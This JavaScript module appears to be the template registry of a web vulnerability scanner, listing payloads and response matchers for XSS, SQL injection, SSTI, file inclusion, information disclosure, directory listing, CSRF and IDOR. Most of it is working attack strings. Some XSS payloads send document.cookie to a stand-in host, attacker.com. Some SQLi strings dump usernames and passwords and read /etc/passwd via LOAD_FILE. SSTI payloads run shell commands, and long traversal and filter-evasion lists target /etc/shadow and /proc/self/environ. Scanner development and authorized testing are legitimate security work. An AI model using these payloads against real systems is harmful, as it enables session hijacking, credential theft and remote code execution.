/**
 * vuln/templates/index.js — Vulnerability Template Registry
 *
 * FOCUS: XSS, SQLi, SSTI, LFI, InfoDisclosure — the most high-value classes.
 *
 * XSS is now CONTEXT-AWARE + BUSINESS-IMPACT focused:
 *   - Use getXssProbe() to get the harmless probe marker
 *   - After response, call detectXssContext() → CONTEXT_CODES
 *   - Then use getXssPayloadsForContext() for precision attack payloads
 *   - All critical contexts include cookie-stealing & domain-leak payloads
 *
 * SQLi now implements full progressive attack chain:
 *   - Error-based fingerprinting
 *   - Auth bypass
 *   - UNION-based data extraction (column enumeration → info_schema → data)
 *   - Boolean-blind and time-based blind
 *   - File read (LOAD_FILE) and privilege check
 */

// ── XSS Context-Aware Payload Map ─────────────────────────────────────────────
// Each key is a CONTEXT_CODE from xssContextDetector.js.
// Payloads are selected based on WHERE the input is reflected.
// TOKEN is replaced with the actual proof token at runtime.
// BUSINESS-IMPACT payloads (cookie-stealing, domain leak) are included in each context.

export const XSS_CONTEXT_PAYLOADS = {

    // Input lands as raw HTML text: <div>INPUT</div>
    // No encoding needed — direct injection works
    HTML_TEXT: [
        // Proof-of-concept (confirmation)
        '<script>alert(TOKEN)</script>',
        '<img src=x onerror=alert(TOKEN)>',
        '<svg onload=alert(TOKEN)>',
        '<details open ontoggle=alert(TOKEN)>',
        // Business impact — cookie exfiltration
        '<script>alert(document.domain+"\n"+document.cookie)</script>',
        '<script>fetch("https://attacker.com/c?d="+document.domain+"&c="+btoa(document.cookie))</script>',
        '<img src=x onerror="fetch(\'//attacker.com/?c=\'+btoa(document.cookie))">',
        // Domain leak (proves origin abuse potential)
        '<script>alert(document.domain)</script>',
        '<body onload=alert(document.cookie)>',
        '<iframe srcdoc="<script>alert(TOKEN)</script>">',
    ],

    // Input is inside a JS double-quoted string: var x = "INPUT"
    // Break out with closing quote, inject JS, comment rest
    SCRIPT_STRING_DOUBLE: [
        '";alert(TOKEN)//',
        '"-alert(TOKEN)-"',
        '\\";alert(TOKEN)//',
        '";alert(TOKEN);//',
        '"+alert(TOKEN)+"',
        // Business impact
        '";alert(document.domain+"\n"+document.cookie)//',
        '";fetch("//attacker.com/?c="+btoa(document.cookie))//',
        '";document.location="//attacker.com/?c="+btoa(document.cookie)//',
        '";window["alert"](document.cookie)//',
    ],

    // Input is inside a JS single-quoted string: var x = 'INPUT'
    // htmlspecialchars without ENT_QUOTES CANNOT encode single quotes →  direct bypass!
    SCRIPT_STRING_SINGLE: [
        "';alert(TOKEN)//",
        "'-alert(TOKEN)-'",
        "\\';alert(TOKEN)//",
        "';alert(TOKEN);//",
        "'+alert(TOKEN)+'",
        // Business impact
        "';alert(document.domain+'\\n'+document.cookie)//",
        "';fetch('//attacker.com/?c='+btoa(document.cookie))//",
        "';document.location='//attacker.com/?c='+btoa(document.cookie)//",
        "';window['alert'](document.cookie)//",
    ],

    // Input inside a <script> block but not in a string (direct eval)
    SCRIPT_BLOCK: [
        'alert(TOKEN)',
        ';alert(TOKEN)//',
        '\nalert(TOKEN)\n',
        '/**/alert(TOKEN)//',
        // Business impact
        ';alert(document.domain)',
        ';alert(document.cookie)',
        ';fetch("//attacker.com/?c="+btoa(document.cookie))',
    ],

    // Input is in a double-quoted attribute: value="INPUT"
    // Break out with ", add event handler
    ATTR_DOUBLE_QUOTE: [
        '" onmouseover="alert(TOKEN)"',
        '" onfocus="alert(TOKEN)" autofocus="',
        '" onload="alert(TOKEN)"',
        '" onerror="alert(TOKEN)"',
        '"><script>alert(TOKEN)</script>',
        '" onanimationstart="alert(TOKEN)" style="animation:x"',
        '"><img src=x onerror=alert(TOKEN)>',
        // Business impact
        '" onmouseover="alert(document.cookie)"',
        '" onfocus="fetch(\'//attacker.com/?c=\'+btoa(document.cookie))" autofocus="',
        '"><script>alert(document.domain+"\n"+document.cookie)</script>',
        // Bug #6 FIX: Angular attribute injection
        '" (click)="alert(1)',
        '" (mouseover)="alert(1)',
    ],

    // Input is in a single-quoted attribute: value='INPUT'
    // htmlspecialchars WITHOUT ENT_QUOTES leaves single quotes raw → exploitable!
    ATTR_SINGLE_QUOTE: [
        "' onmouseover='alert(TOKEN)'",
        "' onfocus='alert(TOKEN)' autofocus='",
        "' onerror='alert(TOKEN)'",
        "' onload='alert(TOKEN)'",
        " onmouseover=alert(TOKEN) x=",
        // Business impact
        "' onmouseover='alert(document.cookie)'",
        "' onfocus='fetch(\"//attacker.com/?c=\"+btoa(document.cookie))' autofocus='",
    ],

    // Input is in an unquoted attribute: value=INPUT
    ATTR_UNQUOTED: [
        ' onmouseover=alert(TOKEN)',
        ' onfocus=alert(TOKEN) autofocus',
        '/><script>alert(TOKEN)</script>',
        ' onerror=alert(TOKEN)',
        // Business impact
        ' onmouseover=alert(document.cookie)',
        ' onfocus=fetch("//attacker.com/?c="+btoa(document.cookie)) autofocus',
    ],

    // Input is in href="INPUT" or src="INPUT"
    // javascript: URI works even WITH htmlspecialchars (no angle brackets needed!)
    // This is a key bypass from the book
    HREF_ATTR: [
        'javascript:alert(TOKEN)',
        'javascript:alert`TOKEN`',
        'JaVaScRiPt:alert(TOKEN)',                      // case mixing bypass
        'javascript:%61lert(TOKEN)',                     // URL-encoded 'a'
        'data:text/html,<script>alert(TOKEN)</script>',
        'javascript:void(alert(TOKEN))',
        // Business impact — cookie leak via href
        'javascript:alert(document.domain)',
        'javascript:alert(document.cookie)',
        'javascript:fetch("//attacker.com/?c="+btoa(document.cookie))',
        'javascript:document.location="//attacker.com/?c="+btoa(document.cookie)',
    ],

    // Input is inside <svg>...<script>let v="INPUT"</script></svg>
    // SVG uses XML parsing rules → &quot; gets decoded back to " by XML parser!
    // This is the htmlspecialchars + SVG bypass from the book
    SVG_CONTEXT: [
        '";alert(TOKEN)//',                             // SVG XML parser decodes &quot; → "
        "';alert(TOKEN)//",
        '</script><script>alert(TOKEN)</script>',
        '<img src=1 onerror=alert(TOKEN)>',
        '/><script>alert(TOKEN)</script>',
        // Business impact
        '";alert(document.cookie)//',
        '";fetch("//attacker.com/?c="+btoa(document.cookie))//',
    ],

    // Input is inside <!-- INPUT --> HTML comment
    HTML_COMMENT: [
        '--><script>alert(TOKEN)</script><!--',
        '--><img src=x onerror=alert(TOKEN)><!--',
        '-->"><script>alert(TOKEN)</script><!--',
        // Business impact
        '--><script>alert(document.cookie)</script><!--',
        '--><img src=x onerror="fetch(\'//attacker.com/?c=\'+btoa(document.cookie))"><!--',
    ],

    // Input is in a style attribute: style="...INPUT..."
    STYLE_ATTR: [
        '" onmouseover="alert(TOKEN)"',
        '} *{background:url("javascript:alert(TOKEN)")}',
        '</style><script>alert(TOKEN)</script>',
        // Business impact
        '" onmouseover="alert(document.cookie)"',
        '</style><script>alert(document.cookie)</script>',
    ],

    // Fallback when context is unknown — XSS Polyglots that work across many contexts
    POLYGLOT: [
        // The ultimate polyglot from Ahmed Elsobky — works in most contexts
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(TOKEN)) //%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(TOKEN)//\\x3e",
        '<script>alert(TOKEN)</script>',
        '<img src=x onerror=alert(TOKEN)>',
        '"><script>alert(TOKEN)</script>',
        "' onmouseover='alert(TOKEN)'",
        '" onmouseover="alert(TOKEN)"',
        '\\";alert(TOKEN)//',
        "\\';alert(TOKEN)//",
        'javascript:alert(TOKEN)',
        '<svg onload=alert(TOKEN)>',
        // Business impact polyglots
        '<script>alert(document.cookie)</script>',
        '"><script>alert(document.domain)</script>',
        '<img src=x onerror="fetch(\'//attacker.com/?c=\'+btoa(document.cookie))">',
        // Bug #6 FIX: Angular-specific vectors
        '{{constructor.constructor(\'alert(1)\')()}}',
        '<img src=1 onerror=alert(1)>',
        '" (click)="alert(1)',
    ],
};

// ── Helper: Get XSS Payloads for a Given Context ──────────────────────────────

/**
 * Returns the most effective XSS payloads for a detected injection context.
 * Falls back to POLYGLOT payloads if context is unknown.
 *
 * @param {string} contextCode         - A CONTEXT_CODES value from xssContextDetector.js
 * @param {string} proofToken          - Runtime proof token (replaces TOKEN)
 * @param {object} [opts]              - Extra options
 * @param {boolean} [opts.htmlencoded] - If true (htmlspecialchars active), skip angle-bracket payloads
 * @param {boolean} [opts.quotesEncoded] - If true (ENT_QUOTES), skip quote-break payloads
 * @returns {string[]}
 */
export function getXssPayloadsForContext(contextCode, opts = {}) {
    const pool = XSS_CONTEXT_PAYLOADS[contextCode] || XSS_CONTEXT_PAYLOADS.POLYGLOT;
    let payloads = [...pool];

    // If htmlspecialchars is active, filter out payloads relying on raw < or >
    if (opts.htmlencoded) {
        payloads = payloads.filter(p => !p.includes('<') && !p.includes('>'));
        // But always keep javascript: and event-handler payloads — they don't need angle brackets
        if (payloads.length === 0) {
            // Fall back to href-style bypass that survives htmlspecialchars
            payloads = [...XSS_CONTEXT_PAYLOADS.HREF_ATTR];
        }
    }

    return payloads;
}

/**
 * Returns the harmless context-detection probe string.
 * Injecting this allows us to detect context without attacking.
 *
 * @param {string} baseMarker  - e.g. 'rvctx_ab12cd34'
 * @returns {string}           - e.g. '<rvctx_ab12cd34>'  (angle brackets to detect encoding)
 */
export function getXssProbe(baseMarker) {
    // Using angle brackets so we can detect if htmlspecialchars is encoding them
    return `<${baseMarker}>`;
}

// ── Remaining Vulnerability Templates ────────────────────────────────────────
// XSS is now context-driven (see XSS_CONTEXT_PAYLOADS above).
// The base XSS template here is kept for backward-compat with any code
// that still calls getTemplate('XSS') — it uses POLYGLOT payloads as safe default.

export const TEMPLATES = {

    XSS: {
        type: 'XSS',
        severity: 'high',
        // Fallback payloads — Phase 2 of unifiedEngine replaces these with context-specific ones
        payloads: XSS_CONTEXT_PAYLOADS.POLYGLOT,
        matchers: [], // populated at runtime via buildXssMatchers()
        verification: 'token_based',
        owasp: 'A03:2021',
        remediation: '- **Output Encoding**: Apply context-aware encoding to all user input.\n- **CSP**: Implement a strict Content-Security-Policy.\n- **Secure Cookies**: Use HttpOnly and Secure flags.',
        impact: 'Successful exploitation allows attackers to hijack user sessions, steal sensitive cookies, perform actions on behalf of the user, and distribute malware via the trusted origin.',
    },

    SQLi: {
        type: 'SQL Injection',
        severity: 'critical',
        payloads: [
            // ── Phase 0: Error-based fingerprinting ──────────────────────────
            // These trigger syntax errors that confirm SQLi and reveal DB type
            "'",
            '"',
            '%',
            "''",
            "' OR '",

            // ── Phase 1: Auth bypass ─────────────────────────────────────────
            // Classic WHERE-clause bypass for login forms
            "' OR 1=1--",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "\" OR \"1\"=\"1",
            "admin'--",
            "admin' #",
            "' OR 1=1#",
            "' OR 1=1/*",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1--",

            // ── Phase 2: Boolean-blind detection ─────────────────────────────
            // Compare responses to confirm boolean-based injection
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "1 AND 1=1",
            "1 AND 1=2",

            // ── Phase 3: UNION-based column count enumeration ─────────────────
            // ORDER BY to find number of columns (error when N exceeds count)
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
            "' ORDER BY 5--",
            // UNION NULL approach
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",

            // ── Phase 4: Reflective column identification ─────────────────────
            // Inject known values to see which column is displayed
            "-1 UNION SELECT 1,2,3--",
            "-1 UNION SELECT 1,2--",
            "-1 UNION SELECT 1,2,3,4--",
            "' AND 1=0 UNION SELECT 1,2,3--",
            "' AND 1=0 UNION SELECT 1,2--",

            // ── Phase 5: DB fingerprinting via UNION ──────────────────────────
            // Extracts version, current user, database name
            "-1 UNION SELECT user(),database(),version()--",
            "-1 UNION SELECT NULL,user(),NULL--",
            "-1 UNION SELECT NULL,version(),NULL--",
            "-1 UNION SELECT NULL,@@version,NULL--",
            "-1 UNION SELECT NULL,current_user,NULL--",

            // ── Phase 6: information_schema enumeration ───────────────────────
            // Enumerate all accessible databases
            "-1 UNION SELECT 1,schema_name,3 FROM information_schema.schemata--",
            // Enumerate tables in current database
            "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
            // Enumerate columns in high-value tables
            "-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
            "-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='accounts'--",
            // Extract credentials
            "-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--",
            "-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM accounts--",
            "-1 UNION SELECT 1,group_concat(email,0x3a,password),3 FROM users--",

            // ── Phase 7: Privilege check ──────────────────────────────────────
            "' UNION SELECT 1,group_concat(privilege_type),3 FROM information_schema.user_privileges-- -",
            "' UNION SELECT ALL 1,group_concat(privilege_type),3 FROM INFORMATION_SCHEMA.USER_PRIVILEGES--",

            // ── Phase 8: File read (requires FILE privilege) ──────────────────
            "-1 UNION SELECT 1,load_file('/etc/passwd'),3--",
            "-1 UNION SELECT 1,load_file(0x2f6574632f706173737764),3--",
            "-1 UNION SELECT 1,to_base64(load_file('/etc/passwd')),3--",

            // ── Phase 9: Time-based blind (confirm when no output visible) ─────
            "1' AND SLEEP(5)-- -",
            "1 AND SLEEP(5)-- -",
            "'; SELECT SLEEP(5)--",
            "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -",
            "'; WAITFOR DELAY '0:0:5'--",          // MSSQL
            "'; SELECT pg_sleep(5)--",              // PostgreSQL
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    /SQL syntax.*MySQL/i,
                    /ORA-\d{5}/i,
                    /PostgreSQL.*ERROR/i,
                    /Microsoft.*ODBC.*SQL Server/i,
                    /sqlite3?\./i,
                    /SQLSTATE\[/i,
                    /you have an error in your sql syntax/i,
                    /unterminated quoted string/i,
                    /Unclosed quotation mark/i,
                    /mysql_fetch/i,
                    /Warning.*mysql/i,
                    /pg_query\(\)/i,
                    /supplied argument is not a valid MySQL/i,
                    /error in your SQL syntax/i,
                    /Warning: mysql_/i,
                ]
            },
            { type: 'timing', minDelayMs: 4000, payloadIndicator: 'SLEEP' },
        ],
        verification: 'error_or_timing',
        owasp: 'A03:2021',
        remediation: '- **Parameterized Queries**: Use prepared statements for all database queries.\n- **Input Validation**: Use allowlists for any input that cannot be parameterized.\n- **Least Privilege**: Ensure the database user has minimal required permissions.',
        impact: 'Can lead to unauthorized access to the entire database, data manipulation, and in some cases, Remote Code Execution (RCE) on the database server.',
    },

    SSTI: {
        type: 'SSTI',
        severity: 'critical',
        payloads: [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{self.__class__.__mro__}}',
            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    /\b49\b/,
                    /Jinja2|Twig|Freemarker|Velocity|Pebble|Smarty/i,
                    /uid=\d+/,
                    /root:.*:0:0/,
                    /"FLASK_|SECRET_KEY|DATABASE_URL/i,
                ]
            },
            { type: 'math_evaluation', expected: '49', probe: '{{7*7}}' },
        ],
        verification: 'pattern_match',
        owasp: 'A03:2021',
        remediation: '- **Avoid Raw Rendering**: Never render user input through a template engine.\n- **Sandboxing**: Use sandboxed template engines and restrict access to dangerous objects.\n- **Input Validation**: Allowlist input before rendering.',
        impact: 'Typically leads to Remote Code Execution (RCE) with web server privileges, resulting in full system compromise.',
    },

    LFI: {
        type: 'LFI',
        severity: 'high',
        payloads: [
            // ── Phase 0: Basic traversal probes ──────────────────────────────────
            // Ref: OWASP Path Traversal, HackTricks LFI, PortSwigger File Path Traversal
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/version',

            // ── Phase 1: URL-encoding bypasses ──────────────────────────────────
            // MITRE T1027 (Obfuscated Files or Information) — evade input filters
            '..%2f..%2f..%2f..%2fetc%2fpasswd',
            '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..%252f..%252f..%252f..%252fetc%252fpasswd',           // Double URL-encode
            '..%255c..%255c..%255c..%255cetc/passwd',               // Double-encoded backslash
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',

            // ── Phase 2: Null-byte injection ─────────────────────────────────────
            // Ref: HackTricks null byte bypass — truncates appended extensions (PHP <5.3.4)
            '../../../etc/passwd%00',
            '../../../../etc/passwd%00',
            '../../../../../etc/passwd%00.html',
            '../../../etc/passwd%00.php',
            '../../../../etc/passwd%00.jpg',

            // ── Phase 3: Filter bypass — dot-dot-slash variants ──────────────────
            // Ref: PortSwigger Academy — bypassing stripped sequences
            '....//....//....//....//etc/passwd',                   // Double-dot bypass if ../ is stripped once
            '....\/....\/....\/....\/etc/passwd',
            '..;/..;/..;/..;/etc/passwd',                           // Tomcat/Java path param bypass
            '..%00/..%00/..%00/..%00/etc/passwd',
            '..\\/..\\/..\\/..\\/..\\/etc/passwd',
            '..\\..\\..\\..\\..\\etc\\passwd',
            '..../..../..../..../etc/passwd',
            '..././..././..././..././etc/passwd',                   // Recursive strip bypass

            // ── Phase 4: Wrapper / Protocol abuse ────────────────────────────────
            // Ref: HackTricks PHP Wrappers, OWASP LFI to RCE
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/read=string.rot13/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=../../../etc/passwd',
            'php://filter/read=convert.base64-encode/resource=index.php',
            'php://filter/convert.iconv.UTF-8.UTF-7/resource=/etc/passwd',
            'file:///etc/passwd',
            'file:///etc/hosts',
            'expect://id',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==',
            'php://input',

            // ── Phase 5: Windows path traversal ──────────────────────────────────
            // Ref: MITRE T1005, HackTricks Windows LFI
            '..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini',
            '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
            'C:\\boot.ini',
            'C:\\windows\\win.ini',
            'C:\\windows\\system32\\drivers\\etc\\hosts',

            // ── Phase 6: Advanced WAF evasion ────────────────────────────────────
            // Ref: Real bug bounty techniques, HackTricks WAF bypass
            '..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',          // UTF-8 overlong encoding
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',          // Unicode fullwidth slash
            '..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc/passwd',          // Invalid UTF-8
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',    // Overlong dot
            '/....//....//....//....//etc/passwd',
            '/..%252f..%252f..%252f..%252fetc/passwd',
            '/var/www/../../etc/passwd',                             // Relative from webroot
            'static/../../../../etc/passwd',

            // ── Phase 7: Log/proc file inclusion (info-gather) ───────────────────
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/nginx/access.log',
            '/var/log/auth.log',
            '/proc/self/fd/0',
            '/proc/self/status',
            '/proc/self/mounts',
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    /root:x:0:0:/,
                    /root:.*:0:0:/,
                    /daemon:x:\d+:\d+:/,
                    /bin\/(?:bash|sh|nologin|false)/,
                    /nobody:x:\d+:\d+:/,
                    /www-data:x:\d+:\d+:/,
                    // Windows targets
                    /\[boot loader\]/i,
                    /\[fonts\]/i,
                    /\[extensions\]/i,
                    /; for 16-bit app support/i,
                    // /proc/version
                    /Linux version \d+\.\d+/,
                    // /proc/self/environ
                    /DOCUMENT_ROOT=|SERVER_SOFTWARE=|PATH=/,
                ]
            },
        ],
        verification: 'pattern_match',
        owasp: 'A01:2021',
        mitre: ['T1005', 'T1083'],
        remediation: '- **Input Validation**: Never pass user input directly to filesystem APIs. Use allowlists for permitted file paths.\n- **Path Canonicalization**: Resolve paths and verify they stay within the intended directory (e.g., `realpath()` check).\n- **Chroot/Sandboxing**: Run the application in a restricted filesystem namespace.\n- **Disable Wrappers**: In PHP, disable `allow_url_include` and `allow_url_fopen` in `php.ini`.\n- **Least Privilege**: Run web server processes with minimal filesystem read permissions.',
        impact: 'Successful exploitation allows attackers to read arbitrary files from the server, including sensitive configuration files (`/etc/passwd`, database credentials, application source code), and may escalate to Remote Code Execution via log poisoning or PHP wrappers.',
    },

    InfoDisclosure: {
        type: 'Information Disclosure',
        severity: 'medium',
        payloads: [
            // Server information leakage probes
            '/',
            '/server-status',
            '/server-info',
            '/.env',
            '/.git/config',
            '/.git/HEAD',
            '/wp-config.php.bak',
            '/config.php.bak',
            '/phpinfo.php',
            '/info.php',
            '/.DS_Store',
            '/crossdomain.xml',
            '/robots.txt',
            '/sitemap.xml',
            '/.well-known/security.txt',
            '/web.config',
            '/WEB-INF/web.xml',
            '/.htaccess',
            '/.svn/entries',
            '/backup.sql',
            '/database.sql',
            '/debug',
            '/trace',
            '/actuator',
            '/actuator/env',
            '/api/swagger.json',
            '/swagger-ui.html',
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    /DB_PASSWORD|DB_HOST|DATABASE_URL|MONGO_URI/i,
                    /SECRET_KEY|API_KEY|AWS_SECRET|PRIVATE_KEY/i,
                    /\[core\]\s*\n\s*repositoryformatversion/i,     // .git/config
                    /ref:\s*refs\/heads\//i,                         // .git/HEAD
                    /phpinfo\(\)/i,
                    /PHP Version \d+\.\d+/i,
                    /Server at .* Port \d+/i,
                    /Index of \//i,
                    /Directory listing for/i,
                    /WEB-INF/i,
                ]
            },
        ],
        verification: 'pattern_match',
        owasp: 'A01:2021',
        remediation: '- **Disable Debug Pages**: Remove or restrict access to phpinfo, server-status, actuator endpoints in production.\n- **Secure SCM**: Ensure `.git`, `.svn` directories are not accessible from the web.\n- **Environment Variables**: Never expose `.env` files; use server-level env vars.\n- **Access Control**: Restrict sensitive paths via web server configuration.',
        impact: 'Exposure of sensitive configuration data, source code, credentials, or internal infrastructure details that can be leveraged for further attacks.',
    },

    // ── NEW: Directory Listing Detection ──────────────────────────────────────
    // Ref: CWE-538 — File and Directory Information Exposure
    // Approach: Probe common sensitive directories and detect directory listing pages

    DirListing: {
        type: 'Directory Listing',
        severity: 'high',
        payloads: [
            // These are PATH probes — appended to base URL, not injected into params
            '/ftp',
            '/ftp/',
            '/backup',
            '/backup/',
            '/uploads',
            '/uploads/',
            '/data',
            '/data/',
            '/files',
            '/files/',
            '/assets',
            '/documents',
            '/tmp',
            '/logs',
            '/private',
            '/internal',
            '/dump',
            '/export',
            '/archive',
            '/old',
            '/dev',
            '/staging',
            '/.git/',
            '/.svn/',
            '/.hg/',
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    /Index of \//i,
                    /Directory listing for/i,
                    /\[To Parent Directory\]/i,
                    /<title>.*Index of/i,
                    /Parent Directory<\/a>/i,
                    /Last modified<\/a>/i,
                    /Name<\/a>.*Last modified<\/a>.*Size<\/a>/i,
                    // Node.js serve / express static listing
                    /listing directory/i,
                    /<!DOCTYPE html>.*<title>listing/i,
                ]
            },
        ],
        verification: 'pattern_match',
        owasp: 'A01:2021',
        cwe: 'CWE-538',
        remediation: '- **Disable Directory Listing**: Configure web server to deny directory browsing (`Options -Indexes` in Apache, `autoindex off` in nginx).\n- **Access Control**: Restrict access to sensitive directories via authentication.\n- **Remove Sensitive Dirs**: Do not expose `/ftp`, `/backup`, `/uploads` publicly.\n- **File Permissions**: Ensure proper file permissions on all directories.',
        impact: 'Attackers can enumerate internal files, discover sensitive documents, backup archives, configuration files, and application source code, enabling further exploitation.',
    },

    // ── NEW: CSRF Detection ──────────────────────────────────────────────────
    // Ref: CWE-352 — Cross-Site Request Forgery
    // Approach: Check state-changing endpoints for missing anti-CSRF protections

    CSRF: {
        type: 'CSRF',
        severity: 'high',
        payloads: [
            // These test state-changing actions — we check if anti-CSRF tokens are absent
            // The engine sends a POST request and checks for missing token validation
            'csrf_probe_password_change',
            'csrf_probe_email_change',
            'csrf_probe_profile_update',
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    // Negative match: we flag CSRF if NONE of the anti-CSRF indicators are present
                    // This is handled by the engine, not the template matcher
                ]
            },
        ],
        // CSRF detection uses custom logic in the engine, not standard pattern matching
        verification: 'csrf_check',
        owasp: 'A01:2021',
        cwe: 'CWE-352',
        remediation: '- **Anti-CSRF Tokens**: Implement unique, per-session CSRF tokens on all state-changing forms.\n- **SameSite Cookies**: Set `SameSite=Strict` or `SameSite=Lax` on session cookies.\n- **Double Submit**: Use double-submit cookie pattern as an additional defense.\n- **Referer Validation**: Validate the Referer/Origin header on sensitive requests.',
        impact: 'Attackers can trick authenticated users into performing unintended actions (password changes, fund transfers, data modification) by crafting malicious pages.',
    },

    // ── NEW: IDOR / Broken Access Control Detection ──────────────────────────
    // Ref: CWE-284, CWE-639 — Insecure Direct Object Reference
    // Approach: Swap ID values in API endpoints and detect unauthorized data access

    IDOR: {
        type: 'IDOR',
        severity: 'high',
        payloads: [
            // Sequential ID probes — the engine replaces ID param values
            '1', '2', '3', '0', '999', '-1',
        ],
        matchers: [
            {
                type: 'pattern', patterns: [
                    // If response contains user data when accessing another user's resource
                    /"email"\s*:/i,
                    /"username"\s*:/i,
                    /"password"\s*:/i,
                    /"user"\s*:/i,
                    /"address"\s*:/i,
                    /"phone"\s*:/i,
                    /"card"\s*:/i,
                    /"credit/i,
                    /"basket"\s*:/i,
                    /"order"\s*:/i,
                ]
            },
        ],
        verification: 'idor_check',
        owasp: 'A01:2021',
        cwe: 'CWE-639',
        remediation: '- **Authorization Checks**: Verify user permissions on EVERY object access, not just authentication.\n- **Indirect References**: Use indirect object references (UUIDs) instead of sequential IDs.\n- **Row-Level Security**: Implement row-level access control at the database layer.\n- **Rate Limiting**: Rate-limit API endpoints to prevent enumeration.',
        impact: 'Attackers can access, modify, or delete other users data including personal information, orders, payment details, and account settings.',
    },
};


/**
 * Build dynamic XSS matchers for a specific proof token.
 * Called at runtime — fixes Breakpoint #2.
 *
 * @param {string} proofToken - e.g. "rvtok_ab12cd34"
 * @returns {Array} matchers array ready to inject into XSS template
 */
export function buildXssMatchers(proofToken) {
    return [
        {
            type: 'pattern',
            patterns: [
                new RegExp(`alert\\(${proofToken}\\)`, 'i'),
                new RegExp(`onerror\\s*=\\s*[^>]*${proofToken}`, 'i'),
                new RegExp(`onload\\s*=\\s*[^>]*${proofToken}`, 'i'),
                new RegExp(`ontoggle\\s*=\\s*[^>]*${proofToken}`, 'i'),
                new RegExp(`<script[^>]*>[^<]*${proofToken}`, 'i'),
                // Also match business-impact payloads
                /alert\(document\.cookie\)/i,
                /alert\(document\.domain\)/i,
                /fetch\([^)]*attacker/i,
                new RegExp(proofToken, 'i'),  // any raw reflection
            ],
        },
        { type: 'token_reflection' },
    ];
}

/** Return template by vuln type key (case-insensitive). */
export function getTemplate(type) {
    const key = Object.keys(TEMPLATES).find(k =>
        k.toLowerCase() === type.toLowerCase() ||
        TEMPLATES[k].type.toLowerCase() === type.toLowerCase()
    );
    return key ? { ...TEMPLATES[key] } : null;
}

/** Return all templates as array (XSS, SQLi, SSTI only). */
export function getAllTemplates() {
    return Object.values(TEMPLATES).map(t => ({ ...t }));
}
